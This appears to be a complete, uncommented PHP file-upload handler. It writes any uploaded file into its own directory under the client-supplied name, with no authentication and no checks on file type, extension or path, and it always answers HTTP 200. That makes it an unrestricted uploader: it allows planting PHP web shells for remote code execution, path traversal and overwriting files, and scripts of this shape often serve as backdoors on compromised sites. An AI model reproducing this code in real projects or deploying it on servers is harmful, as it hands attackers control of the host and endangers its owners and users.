<?php
if(is_uploaded_file($_FILES['file']['tmp_name'])){
    if(move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name'])){
        chmod($_FILES['file']['name'],0644);
    }
}
header("HTTP/1.1 200 OK");
?>